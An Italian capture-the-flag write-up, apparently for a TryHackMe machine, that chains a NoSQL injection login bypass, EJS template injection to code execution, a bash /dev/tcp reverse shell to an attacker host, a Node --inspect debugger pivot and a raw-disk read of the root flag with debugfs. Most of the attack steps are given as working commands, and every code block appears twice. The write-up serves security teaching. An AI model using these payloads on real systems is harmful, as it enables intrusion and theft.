Do Not Disturb: dal bordo piscina a root, un anello alla volta

Byte Lotus è una piattaforma di booking per cabana e lettini a bordo piscina, e a quanto pare qualcuno ci sta già giocando: wallet che cambiano da soli, sessioni dirottate. Ci sono entrato anch'io, ma con metodo: una login che si fidava troppo del JSON, una feature «staff» che si fidava ancora di più, e un debugger Node lasciato in ascolto. Nessuno di questi bug è «critico» da solo; il problema, come sempre, è la catena.

// TL;DR
  • Bypass login con NoSQL injection: {"$ne":""} nel body JSON di Express.
  • SSTI in EJS su /staff/preview: <%= 7*7 %> restituisce 49.
  • RCE aggirando require via global.process.mainModule.require.
  • Privesc: pivot su pipelinesvc attraverso node --inspect (CDP su :9229).
  • Root flag dal disco grezzo: gruppo disk + debugfs, senza uid=0.

[01] Recon: due porte e un 403 parlante

Due porte, zero sorprese. Per ora. Un nmap completo trova solo SSH e un'app Node.js/Express su HTTP: «Byte Lotus — Poolside».

nmap -sC -sV -p- -T4 <target>
# 22/tcp  open  ssh
# 80/tcp  open  http   Node.js (Express) — "Byte Lotus — Poolside"
nmap -sC -sV -p- -T4 <target>
# 22/tcp  open  ssh
# 80/tcp  open  http   Node.js (Express) — "Byte Lotus — Poolside"

Fuzzo i path. Non cerco file segreti: cerco la superficie, cosa esiste e cosa è protetto.

ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .js,.json,.txt -mc 200,301,302,403 -t 50
# /login    200
# /logout   302
# /staff    403   # esiste, ma non mi fanno entrare
ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .js,.json,.txt -mc 200,301,302,403 -t 50
# /login    200
# /logout   302
# /staff    403   # it exists, but I'm not allowed in

Quel 403 su /staff è un cartello, non un muro: la pagina esiste, quindi da qualche parte c'è un cancello di autenticazione da forzare. Il login diventa il bersaglio.

// nota

Un 403 invece di un 404 conferma l'esistenza della risorsa: l'enumerazione impara più dai codici di stato che dai contenuti.

[02] Login bypass con NoSQL injection

La login accetta JSON, è Express. Invece di indovinare credenziali cambio la forma dell'input: al posto di stringhe passo operatori di query MongoDB.

curl -s -i -X POST http://<target>/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
# HTTP/1.1 302 Found
# Set-Cookie: connect.sid=s%3A...
curl -s -i -X POST http://<target>/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
# HTTP/1.1 302 Found
# Set-Cookie: connect.sid=s%3A...

$ne vuol dire «diverso da». La query diventa «trovami un utente il cui username non è vuoto e la cui password non è vuota»: cioè chiunque. Il server mi consegna una sessione valida senza che io conosca una sola credenziale.

Perché funziona? express.json() deserializza oggetti annidati, e il codice passa quell'oggetto dritto nel filtro, tipo User.findOne({ username, password }). Se password è la stringa attesa è un confronto; se è un oggetto $ne diventa un operatore. La difesa non è «vietare $ne», è tipizzare: forzare String(...) o passare da mongo-sanitize prima che l'input tocchi il DB.

// antipattern

Fidarsi della forma del JSON. Un body come {"$gt":""} è indistinguibile da una stringa finché non lo tipizzi tu.

[03] SSTI in EJS: da template a shell

Con il cookie /staff si apre: è la console «Cabana Desk», con un form per personalizzare il messaggio di conferma prenotazione. Il messaggio è un template EJS, e me lo lascia scrivere. Testo subito l'ovvio.

curl -s -X POST http://<target>/staff/preview \
  -H "Cookie: connect.sid=<cookie>" \
  --data-urlencode 'template=<%= 7*7 %>'
# 49    <- il server calcola, non stampa
curl -s -X POST http://<target>/staff/preview \
  -H "Cookie: connect.sid=<cookie>" \
  --data-urlencode 'template=<%= 7*7 %>'
# 49    <- the server computes, it doesn't print

49, non 7*7: il server esegue il mio template invece di mostrarlo. SSTI confermata. Il passo dopo è uscire dal template verso Node.

require diretto è bloccato («require is not defined»), ma EJS gira nello scope globale di Node e global.process è sempre lì. Da process.mainModule.require recupero require, e con lui child_process.

curl -s -X POST http://<target>/staff/preview \
  -H "Cookie: connect.sid=<cookie>" \
  --data-urlencode "template=<%= global.process.mainModule.require('child_process').execSync('id').toString() %>"
# uid=996(poolside) gid=996(poolside) groups=996(poolside)
curl -s -X POST http://<target>/staff/preview \
  -H "Cookie: connect.sid=<cookie>" \
  --data-urlencode "template=<%= global.process.mainModule.require('child_process').execSync('id').toString() %>"
# uid=996(poolside) gid=996(poolside) groups=996(poolside)

RCE come poolside. Da qui una shell è una formalità: metto un listener e cambio id con una reverse shell.

# sul mio box
nc -lvnp 4444

# stesso /staff/preview, payload diverso
<%= global.process.mainModule.require('child_process').execSync("bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1'").toString() %>
# on my box
nc -lvnp 4444

# same /staff/preview, different payload
<%= global.process.mainModule.require('child_process').execSync("bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1'").toString() %>

Connessione in arrivo: shell come poolside. La user flag è a portata di cat.

find / -name user.txt 2>/dev/null
cat /home/poolside/user.txt
# THM{████████████████████}
find / -name user.txt 2>/dev/null
cat /home/poolside/user.txt
# THM{████████████████████}
// nota

Bloccare require non è una sandbox. Finché il template vede global (o this, o constructor) c'è sempre una via verso process. Sandboxare template utente è una guerra che di solito si perde: meglio non farglieli scrivere.

[04] Da poolside a root: Node --inspect e gruppo disk

sudo -l vuole una password che non ho: vicolo cieco. Allora guardo cosa gira sulla macchina, ed ecco l'errore di qualcun altro.

sudo -l                      # chiede una password: stop
ps aux | grep -i node
# pipelin+ ... /usr/bin/node --inspect=127.0.0.1:9229 processor.js
sudo -l                      # asks for a password: stop
ps aux | grep -i node
# pipelin+ ... /usr/bin/node --inspect=127.0.0.1:9229 processor.js

--inspect apre il Chrome DevTools Protocol: chiunque raggiunga quella porta può eseguire JavaScript arbitrario dentro quel processo, require('child_process') incluso. È legata a 127.0.0.1, ma una shell sul box ce l'ho già: localhost non è un confine di sicurezza.

curl -s http://127.0.0.1:9229/json/list
# "webSocketDebuggerUrl": "ws://127.0.0.1:9229/<uuid>"
curl -s http://127.0.0.1:9229/json/list
# "webSocketDebuggerUrl": "ws://127.0.0.1:9229/<uuid>"

Scrivo un piccolo client WebSocket in Node che apre quella URL e invia un comando Runtime.evaluate. È solo protocollo: un handshake e un JSON. Il debugger esegue nel contesto di pipelinesvc.

# client CDP minimale in /tmp/cdp.js: WebSocket -> Runtime.evaluate -> execSync
node /tmp/cdp.js "id"
# uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
# minimal CDP client in /tmp/cdp.js: WebSocket -> Runtime.evaluate -> execSync
node /tmp/cdp.js "id"
# uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)

Pivot da poolside a pipelinesvc senza toccarne la password. E pipelinesvc è nel gruppo disk: qui la partita è già decisa.

Il gruppo disk dà lettura sui device a blocchi grezzi, e questo scavalca del tutto i permessi del filesystem: leggo i byte del disco, non i file. Non serve essere root, basta debugfs sul device giusto.

node /tmp/cdp.js "cat /proc/partitions"
# ... nvme0n1p1    <- partizione root

node /tmp/cdp.js "debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1 2>&1"
# THM{████████████████████}
node /tmp/cdp.js "cat /proc/partitions"
# ... nvme0n1p1    <- root partition

node /tmp/cdp.js "debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1 2>&1"
# THM{████████████████████}

Root flag letta senza mai diventare root. Nota metodica: «root flag» non implica «uid=0». Qui la catena finisce con una lettura a basso livello, e chi difende dovrebbe modellare la minaccia sui dati, non solo sull'utente che li tocca.

// flag — OSCURATA
THM{████████████████████}

La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo Enter lo batti tu.

// lezione

La catena si spezza a ogni anello, e ne basta uno. 1) Tipizza gli input prima del DB (String() o mongo-sanitize): niente operatori $ne. 2) Non far scrivere template agli utenti: EJS con global.process è RCE, non «personalizzazione». 3) Mai --inspect in produzione, nemmeno su localhost: qualsiasi foothold diventa esecuzione come l'utente del processo. 4) I gruppi contano quanto gli utenti: disk è di fatto root. Difesa in profondità vuol dire che nessuno di questi, da solo, ti compromette.
